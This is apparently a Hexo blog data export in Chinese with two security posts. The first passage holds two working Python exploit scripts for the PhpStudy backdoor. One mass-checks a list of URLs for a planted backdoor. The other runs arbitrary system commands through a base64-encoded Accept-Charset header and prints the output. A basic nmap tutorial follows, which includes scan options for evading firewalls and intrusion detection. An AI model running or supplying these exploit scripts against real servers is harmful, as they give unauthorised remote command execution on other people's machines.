class=\"string\">'gzip,deflate'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        r = requests.get(url=url+<span class=\"string\">'/index.php'</span>, headers=headers, verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"202cb962ac59075b964b07152d234b70\"</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">print</span> (<span class=\"string\">'[ + ] BackDoor successful: '</span>+url+<span class=\"string\">'===============[ + ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">with</span> open(files+<span class=\"string\">'.success.txt'</span>,<span class=\"string\">'a'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\"></span><br><span class=\"line\">                    f.write(url+<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">print</span> (<span class=\"string\">'[ - ] BackDoor failed: '</span>+url+<span class=\"string\">'[ - ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">print</span> (<span class=\"string\">'[ - ] Timeout: '</span>+url+<span class=\"string\">' [ - ]\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(files,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\"></span><br><span class=\"line\">        lines = f.read().splitlines()</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool=threadpool.ThreadPool(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        requests=threadpool.makeRequests(write_shell,lines)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> req <span class=\"keyword\">in</span> requests:</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool.putRequest(req)</span><br><span class=\"line\"></span><br><span class=\"line\">        task_pool.wait()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<h3 id=\"交互Shell\"><a href=\"#交互Shell\" class=\"headerlink\" title=\"交互Shell\"></a>交互Shell</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> threadpool</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">\"======Phpstudy Backdoor Exploit---os-shell============\\n\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"===========By  Qing=================\\n\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">\"=====Blog：https://www.cnblogs.com/-qing-/==\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">os_shell</span><span class=\"params\">(url,headers,payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.get(url=url+<span class=\"string\">'/phpinfo.php'</span>,headers=headers,verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(r.text)</span></span><br><span class=\"line\">        res = re.findall(<span class=\"string\">\"qing(.*?)qing\"</span>,r.text,re.S)</span><br><span class=\"line\">        print(<span class=\"string\">\"[ + ]===========The Response:==========[ + ]\\n\"</span>)</span><br><span class=\"line\">        res = <span class=\"string\">\"\"</span>.join(res)</span><br><span class=\"line\">        print(res)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[ - ]===========Failed! Timeout...==========[ - ]\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url = input(<span class=\"string\">\"input the Url , example:\\\"http://127.0.0.1/\\\"\\n\"</span>)</span><br><span class=\"line\">    payload = input(<span class=\"string\">\"input the payload , default:echo system(\\\"whoami\\\");\\n\"</span>)</span><br><span class=\"line\">    de_payload = <span class=\"string\">\"echo \\\"qing\\\";system(\\\"whoami\\\");echo \\\"qing\\\";\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.strip() == <span class=\"string\">''</span>:</span><br><span class=\"line\">        payload = de_payload</span><br><span class=\"line\">    payload = <span class=\"string\">\"echo \\\"qing\\\";\"</span>+payload+<span class=\"string\">\"echo \\\"qing\\\";\"</span></span><br><span class=\"line\">    payload = base64.b64encode(payload.encode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    payload = str(payload, <span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'Upgrade-Insecure-Requests'</span>: <span class=\"string\">'1'</span>,</span><br><span class=\"line\">    <span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Accept'</span>: <span class=\"string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Accept-Language'</span>: <span class=\"string\">'zh-CN,zh;q=0.9'</span>,</span><br><span class=\"line\">    <span class=\"string\">'accept-charset'</span>: payload,</span><br><span class=\"line\">    <span class=\"string\">'Accept-Encoding'</span>: <span class=\"string\">'gzip,deflate'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Connection'</span>: <span class=\"string\">'close'</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    os_shell(url=url,headers=headers,payload=payload)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"nmap基本使用","abbrlink":5820,"_content":"\n### 前言\n\nNmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务\n\nNmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。\n\n<!--more-->\n\n#### 打开端口扫描和操作系统检测\n\n使用以下命令确定活动主机：\n\n```\nnmap -sP 192.168.0.0-100\n```\n\n使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描\n\n```\nnmap -sS [IP地址] -O\n```\n\n使用以下命令启动一个开放端口扫描和版本检测\n\n```\nnmap -sV 192.168.0.1 -A\n```\n\n将-v添加到命令中时，可以增加冗长度\n\n```\nnmap -sV 192.168.0.13 -A -v\n```\n\n\n\n#### 服务器是否响应 ping，或者服务器是否打开\n\n使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）\n\n```\nnmap -sn 192.168.56.102\n```\n\n#### 打开了哪些端口\n\n调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果\n\n```\nnmap 192.168.56.102\n```\n\n\n#### Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\n\n- sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。\n\n- O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。\n\n\n```\nnmap -sV -O 192.168.56.10\n```\n\n####  更加清楚的查看这个端口，并且看看可以确认什么\n\n使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）\n\n```\nnmap -sC 192.168.56.102 -p 21\n```\n\n#### Nmap 包含了一些脚本，用于测试 WAF 的存在\n\n```\nmap -p 80,443 --script=http-waf-detect 192.168.56.102\n```\n\n#### 另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确\n\n```\nnmap -p 80,443 --script=http-waf-fingerprint www.example.com\n```\n\n\n#### 有一些其它的实用参数：\n\n- sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。\n- Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。\n- v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。\n- p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。\n\n- --script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：https://nmap.org/nsedoc/scripts/。\n\n### Nmap选项摘要\n\n**用法：nmap [扫描类型] [选项] {目标规格}**\n\n#### 目标规格：\n\n可以传递主机名，IP地址，网络等。\n例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254\n\n- -iL <inputfilename>：从主机/网络列表中输入\n- -iR <num hosts>：选择随机目标\n- -exclude <host1 [，host2] [，host3]，…>：排除主机/网络\n- -excludefile <exclude_file>：从文件中排除列表\n\n#### 主机发现：\n\n- -sL：列表扫描 – 仅列出要扫描的目标\n- -sn：Ping扫描 – 禁用端口扫描\n- -Pn：将所有主机视为联机 – 跳过主机发现\n- -PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口\n- -PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测\n- -PO [协议列表]：IP协议Ping\n- -n / -R：从不执行DNS解析/总是解析[默认：有时]\n- -dns-servers <serv1 [，serv2]，…>：指定自定义DNS服务器\n- -system-dns：使用操作系统的DNS解析器\n- -traceroute：每个主机的跟踪跳转路径\n\n#### SCAN技术：\n\n- -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描\n- -sU：UDP 扫描-sN\n- / sF / sX：TCP Null，FIN和Xmas扫描\n- –scanflags < flags>：自定义TCP扫描标志\n- -sI <zombie host [：probeport]>：空闲扫描\n- -sY / sZ：SCTP INIT / COOKIE-ECHO扫描\n- -sO：IP协议扫描\n- -b <FTP中继主机>：FTP反弹扫描\n\n#### 端口规格和扫描 顺序：-p\n\n<端口范围>：仅扫描指定的端口\n\n- 例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9\n- -exclude-ports <端口范围>：从扫描中排除指定端口\n- -F：快速模式 – 扫描端口少于默认扫描\n- -r：连续扫描端口 – 不随机化\n- -top-ports <number>：扫描<number>最常用的端口\n- -port-ratio <ratio>：扫描比<ratio>\n\n#### 服务/版本检测：\n\n- -sV：探测开放端口以确定服务/版本info\n- -version-intensity <level>：设置从0（亮）到9（尝试所有探测器）\n- -version-light：限制最可能的探测器2）\n- -version-all：尝试每个探测器（强度9）\n- -version-trace：显示详细版本的扫描活动（用于调试）\n\n#### SCRIPT SCAN：\n\n- -sC：相当于-script =默认\n- -script = <Lua脚本>：<Lua scripts>是逗号分隔的\n- 目录列表，脚本文件或脚本类别\n- -script-args = <n1 = v1，[ n2 = v2，…]>：为脚本提供参数\n- -script-args-file = filename：在文件中提供NSE脚本参数\n- -script-trace：显示所有发送和接收的数据\n- -script-updatedb：更新脚本数据库。\n- -script-help = <Lua scripts>：显示有关脚本的帮助。\n- <Lua scripts>是脚本文件或\n- 脚本类别的逗号分隔列表。\n\n#### 操作系统检测：\n\n- -O：启用操作系统检测\n- -osscan-limit：限制操作系统检测为有前途的目标\n- -osscan-guess：猜测操作系统更积极\n\n#### 时间和性能：\n\n- 采用`<time>`的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。\n- -T <0-5>：设置定时模板（更高更快）\n- -min-hostgroup / max-hostgroup <size>：并行主机扫描组大小\n- -min-parallelism / max-parallelism <numprobes>：探针并行化\n- -min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定\n- 探测往返时间。\n- -max-retries <tries>：端口扫描探测器重新传输的大小数量。\n- -host-timeout <time>：在这个long\n- -scan-delay 之后放弃目标/ -max-scan-delay <time>：调整探针之间的延迟\n- -min-rate <number>：\n- -max-rate <number>：发送数据包不超过每秒<number>\n\n#### 防火墙/ IDS消除和防盗：\n\n- -f; -mtu <val>：片段数据包（可选w / given MTU）\n- -D <decoy1，decoy2 [，ME]，…>：用诱饵隐藏扫描\n- -S <IP_Address>：欺骗源地址\n- -e <iface>：使用指定的接口\n- -g / -source-port <\n- portnum >：使用给定的端口号-proxies <url1，[url2]，…>：通过HTTP / SOCKS4代理服务器的中继连接\n- -data <十六进制字符串>：将自定义有效内容附加到已发送数据包\n- -data-string <string>：将自定义ASCII字符串附加到已发送数据包\n- -data-length <num>：将随机数据附加到已发送数据包\n- -ip-options <选项>：发送指定ip选项的数据包\n- -ttl <val>：设置IP生存时间字段\n- -spoof-mac <\n- -badsum：发送虚假TCP / UDP / SCTP校验和的数据包\n\n#### OUTPUT\n\n- -oN / -oX / -oS / -oG <file>：分别以正常，XML，s | <rIpt kIddi3\n- 和Grepable格式输出扫描到给定的文件名。\n- -oA <basename>：一次输出三种主要格式\n- -v：提高详细级别（使用-vv或更多以获得更大效果）\n- -d：提高调试级别（使用-dd或更多以获得更大效果）\n- -reason：Display端口处于特定状态的原因\n- -open：只显示打开的（或可能打开的）端口\n- -packet-trace：显示所有发送和接收的数据包\n- -iflist：打印主机接口和路由（用于调试）\n- -log-errors：Log错误/警告到正常格式的输出文件\n- -append-output：附加到指定的输出文件而不是clobber\n- -resume <filename>：恢复中止的扫描\n- -stylesheet <path / URL>：XSL样式表将XML输出转换为HTML\n- -webxml：Nmap.Org的参考样式表，用于更多可移植的XML\n- -no-stylesheet：防止关联XSL样式表w / XML输出\n\n#### MISC：\n\n- -6：启用IPv6扫描\n- -A：启用OS检测，版本检测，脚本扫描和traceroute\n- -datadir <dirname>：指定自定义Nmap数据文件位置\n- -send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包\n- -privileged：假设用户具有完全特权\n- -unprivileged：假定用户缺少原始套接字权限\n- -V：打印版本号\n- -h：打印此帮助摘要页面\n\n\n#### 另见\n\n虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：\n\n- unicornscan\n- hping3\n- masscan\n- amap\n- Metasploit scanning module","source":"_posts/2019/9/nmap基本使用.md","raw":"---\nlayout: post\ntitle: nmap基本使用\ntags:\n  - tool\ncategories:\n  - hacker\nabbrlink: 5820\n---\n\n### 前言\n\nNmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务\n\nNmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。\n\n<!--more-->\n\n#### 打开端口扫描和操作系统检测\n\n使用以下命令确定活动主机：\n\n```\nnmap -sP 192.168.0.0-100\n```\n\n使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描\n\n```\nnmap -sS [IP地址] -O\n```\n\n使用以下命令启动一个开放端口扫描和版本检测\n\n```\nnmap -sV 192.168.0.1 -A\n```\n\n将-v添加到命令中时，可以增加冗长度\n\n```\nnmap -sV 192.168.0.13 -A -v\n```\n\n\n\n#### 服务器是否响应 ping，或者服务器是否打开\n\n使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）\n\n```\nnmap -sn 192.168.56.102\n```\n\n#### 打开了哪些端口\n\n调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果\n\n```\nnmap 192.168.56.102\n```\n\n\n#### Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统\n\n- sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。\n\n- O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。\n\n\n```\nnmap -sV -O 192.168.56.10\n```\n\n####  更加清楚的查看这个端口，并且看看可以确认什么\n\n使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC）\n\n```\nnmap -sC 192.168.56.102 -p 21\n```\n\n#### Nmap 包含了一些脚本，用于测试 WAF 的存在\n\n```\nmap -p 80,443 --script=http-waf-detect 192.168.56.102\n```\n\n#### 另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确\n\n```\nnmap -p 80,443 --script=http-waf-fingerprint www.example.com\n```\n\n\n#### 有一些其它的实用参数：\n\n- sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。\n- Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。\n- v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。\n- p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。\n\n- --script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：https://nmap.org/nsedoc/scripts/。\n\n### Nmap选项摘要\n\n**用法：nmap [扫描类型] [选项] {目标规格}**\n\n#### 目标规格：\n\n可以传递主机名，IP地址，网络等。\n例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254\n\n- -iL <inputfilename>：从主机/网络列表中输入\n- -iR <num hosts>：选择随机目标\n- -exclude <host1 [，host2] [，host3]，…>：排除主机/网络\n- -excludefile <exclude_file>：从文件中排除列表\n\n#### 主机发现：\n\n- -sL：列表扫描 – 仅列出要扫描的目标\n- -sn：Ping扫描 – 禁用端口扫描\n- -Pn：将所有主机视为联机 – 跳过主机发现\n- -PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口\n- -PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测\n- -PO [协议列表]：IP协议Ping\n- -n / -R：从不执行DNS解析/总是解析[默认：有时]\n- -dns-servers <serv1 [，serv2]，…>：指定自定义DNS服务器\n- -system-dns：使用操作系统的DNS解析器\n- -traceroute：每个主机的跟踪跳转路径\n\n#### SCAN技术：\n\n- -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描\n- -sU：UDP 扫描-sN\n- / sF / sX：TCP Null，FIN和Xmas扫描\n- –scanflags < flags>：自定义TCP扫描标志\n- -sI <zombie host [：probeport]>：空闲扫描\n- -sY / sZ：SCTP INIT / COOKIE-ECHO扫描\n- -sO：IP协议扫描\n- -b <FTP中继主机>：FTP反弹扫描\n\n#### 端口规格和扫描 顺序：-p\n\n<端口范围>：仅扫描指定的端口\n\n- 例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9\n- -exclude-ports <端口范围>：从扫描中排除指定端口\n- -F：快速模式 – 扫描端口少于默认扫描\n- -r：连续扫描端口 – 不随机化\n- -top-ports <number>：扫描<number>最常用的端口\n- -port-ratio <ratio>：扫描比<ratio>\n\n#### 服务/版本检测：\n\n- -sV：探测开放端口以确定服务/版本info\n- -version-intensity <level>：设置从0（亮）到9（尝试所有探测器）\n- -version-light：限制最可能的探测器2）\n- -version-all：尝试每个探测器（强度9）\n- -version-trace：显示详细版本的扫描活动（用于调试）\n\n#### SCRIPT SCAN：\n\n- -sC：相当于-script =默认\n- -script = <Lua脚本>：<Lua scripts>是逗号分隔的\n- 目录列表，脚本文件或脚本类别\n- -script-args = <n1 = v1，[ n2 = v2，…]>：为脚本提供参数\n- -script-args-file = filename：在文件中提供NSE脚本参数\n- -script-trace：显示所有发送和接收的数据\n- -script-updatedb：更新脚本数据库。\n- -script-help = <Lua scripts>：显示有关脚本的帮助。\n- <Lua scripts>是脚本文件或\n- 脚本类别的逗号分隔列表。\n\n#### 操作系统检测：\n\n- -O：启用操作系统检测\n- -osscan-limit：限制操作系统检测为有前途的目标\n- -osscan-guess：猜测操作系统更积极\n\n#### 时间和性能：\n\n- 采用`<time>`的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。\n- -T <0-5>：设置定时模板（更高更快）\n- -min-hostgroup / max-hostgroup <size>：并行主机扫描组大小\n- -min-parallelism / max-parallelism <numprobes>：探针并行化\n- -min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout <time>：指定\n- 探测往返时间。\n- -max-retries <tries>：端口扫描探测器重新传输的大小数量。\n- -host-timeout <time>：在这个long\n- -scan-delay 之后放弃目标/ -max-scan-delay <time>：调整探针之间的延迟\n- -min-rate <number>：\n- -max-rate <number>：发送数据包不超过每秒<number>\n\n#### 防火墙/ IDS消除和防盗：\n\n- -f; -mtu <val>：片段数据包（可选w / given MTU）\n- -D <decoy1，decoy2 [，ME]，…>：用诱饵隐藏扫描\n- -S <IP_Address>：欺骗源地址\n- -e <iface>：使用指定的接口\n- -g / -source-port <\n- portnum >：使用给定的端口号-proxies <url1，[url2]，…>：通过HTTP / SOCKS4代理服务器的中继连接\n- -data <十六进制字符串>：将自定义有效内容附加到已发送数据包\n- -data-string <string>：将自定义ASCII字符串附加到已发送数据包\n- -data-length <num>：将随机数据附加到已发送数据包\n- -ip-options <选项>：发送指定ip选项的数据包\n- -ttl <val>：设置IP生存时间字段\n- -spoof-mac <\n- -badsum：发送虚假TCP / UDP / SCTP校验和的数据包\n\n#### OUTPUT\n\n- -oN / -oX / -oS / -oG <file>：分别以正常，XML，s | <rIpt kIddi3\n- 和Grepable格式输出扫描到给定的文件名。\n- -oA <basename>：一次输出三种主要格式\n- -v：提高详细级别（使用-vv或更多以获得更大效果）\n- -d：提高调试级别（使用-dd或更多以获得更大效果）\n- -reason：Display端口处于特定状态的原因\n- -open：只显示打开的（或可能打开的）端口\n- -packet-trace：显示所有发送和接收的数据包\n- -iflist：打印主机接口和路由（用于调试）\n- -log-errors：Log错误/警告到正常格式的输出文件\n- -append-output：附加到指定的输出文件而不是clobber\n- -resume <filename>：恢复中止的扫描\n- -stylesheet <path / URL>：XSL样式表将XML输出转换为HTML\n- -webxml：Nmap.Org的参考样式表，用于更多可移植的XML\n- -no-stylesheet：防止关联XSL样式表w / XML输出\n\n#### MISC：\n\n- -6：启用IPv6扫描\n- -A：启用OS检测，版本检测，脚本扫描和traceroute\n- -datadir <dirname>：指定自定义Nmap数据文件位置\n- -send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包\n- -privileged：假设用户具有完全特权\n- -unprivileged：假定用户缺少原始套接字权限\n- -V：打印版本号\n- -h：打印此帮助摘要页面\n\n\n#### 另见\n\n虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品：\n\n- unicornscan\n- hping3\n- masscan\n- amap\n- Metasploit scanning module","slug":"2019/9/nmap基本使用","published":1,"date":"2019-09-09T07:39:17.776Z","updated":"2020-04-12T06:34:43.628Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzy001z44vqmykcgqgw","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Nmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务</p>\n<p>Nmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。</p>\n<a id=\"more\"></a>\n<h4 id=\"打开端口扫描和操作系统检测\"><a href=\"#打开端口扫描和操作系统检测\" class=\"headerlink\" title=\"打开端口扫描和操作系统检测\"></a>打开端口扫描和操作系统检测</h4><p>使用以下命令确定活动主机：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sP <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span><span class=\"number\">-100</span></span><br></pre></td></tr></table></figure>\n<p>使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"built_in\">sS</span> [<span class=\"built_in\">IP</span>地址] -O</span><br></pre></td></tr></table></figure>\n<p>使用以下命令启动一个开放端口扫描和版本检测</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span> <span class=\"selector-tag\">-A</span></span><br></pre></td></tr></table></figure>\n<p>将-v添加到命令中时，可以增加冗长度</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.13</span> <span class=\"selector-tag\">-A</span> <span class=\"selector-tag\">-v</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"服务器是否响应-ping，或者服务器是否打开\"><a href=\"#服务器是否响应-ping，或者服务器是否打开\" class=\"headerlink\" title=\"服务器是否响应 ping，或者服务器是否打开\"></a>服务器是否响应 ping，或者服务器是否打开</h4><p>使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping）</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sn</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.56</span><span class=\"selector-class\">.102</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"打开了哪些端口\"><a href=\"#打开了哪些端口\" class=\"headerlink\" title=\"打开了哪些端口\"></a>打开了哪些端口</h4><p>调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 